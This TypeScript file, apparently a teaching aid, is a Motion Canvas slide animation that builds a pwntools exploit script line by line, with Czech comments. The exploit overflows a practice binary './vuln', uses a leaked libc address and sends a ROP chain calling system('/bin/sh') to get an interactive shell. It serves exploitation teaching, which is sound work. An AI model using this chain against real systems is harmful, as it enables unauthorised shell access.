import {Circle, Layout, Ray, Rect, Txt, makeScene2D} from '@motion-canvas/2d';
import { CodeBlock, insert, lines } from '@motion-canvas/2d/lib/components/CodeBlock';
import {DEFAULT, Reference, all, beginSlide, createRef, createSignal} from '@motion-canvas/core';

const BACKGROUND = '#282C34';
const RED = '#E06C75';
const GREEN = '#98C379';
const YELLOW = '#E5C07B';
const BLUE = '#61AFEF';
const MAGENTA = '#C678DD';
const CYAN = '#56B6C2';
const GRAY = '#ABB2BF';
const WHITE = '#FFFFFF';
const BLACK = '#000000';

export default makeScene2D(function* (view) {
    let cref = createRef<CodeBlock>();
    yield view.add(
        <CodeBlock
            code={"from pwm import *"}
            language='python'
            ref={cref}
            fontSize={56}
        />);
    yield* beginSlide("first");

    yield* cref().edit(.5, lines(2,4))`from pwm import *${insert(`

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně`)}`;
    yield* beginSlide("setup");

    yield* cref().edit(.5, lines(6,8))`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně${insert(`

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")
`)}`;

    yield* beginSlide("setup2");


    yield* cref().edit(.5)`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")
${insert(`
bin = ELF("./vuln")
libc = ELF("./libc.so.6")
`)}`;

    yield* beginSlide("setup3");


    yield* cref().edit(.5, lines(13,14))`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")
${insert(`
io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")
`)}`;

    yield* beginSlide("io.sendline")

    yield* cref().edit(.5, lines(15,18))`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")
${insert(`
io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)
`)}`;

    yield* beginSlide("code")
    yield* cref().fontSize(48, .5);

    yield* cref().edit(.5, lines(19,23))`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)
${insert(`
io.sendline(flat({
    0x8: 1,
    72: code,
}))
`)}`;

    yield* beginSlide("flat")


    yield* cref().edit(.5, lines(24,26))`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)

io.sendline(flat({
    0x8: 1,
    72: code,
}))
${insert(`
offset = int(io.recvline(), 16)
libc.address = offset
`)}`;

    yield* beginSlide("offset")


    yield* cref().edit(.5, lines(27, 30))`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)

io.sendline(flat({
    0x8: 1,
    72: code,
}))

offset = int(io.recvline(), 16)
libc.address = offset
${insert(`
rop = ROP(libc, badchars=b'\\n')
rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
rop.call(libc.sym["exit"], [0])
`)}`;

    yield* beginSlide("rop")


    yield* cref().edit(.5, lines(32))`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)

io.sendline(flat({
    0x8: 1,
    72: code,
}))

offset = int(io.recvline(), 16)
libc.address = offset

rop = ROP(libc, badchars=b'\\n')
rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
rop.call(libc.sym["exit"], [0])
${insert(`
io.sendline(rop.chain())
`)}`;

    yield* beginSlide("send rop")


    yield* cref().edit(.5, lines(33))`
from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)

io.sendline(flat({
    0x8: 1,
    72: code,
}))

offset = int(io.recvline(), 16)
libc.address = offset

rop = ROP(libc, badchars=b'\\n')
rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
rop.call(libc.sym["exit"], [0])

io.sendline(rop.chain())
${insert(`
io.interactive()
`)}`;

    yield* beginSlide("interactive")

    yield* cref().selection(DEFAULT, .5);


    yield* beginSlide("final");
});
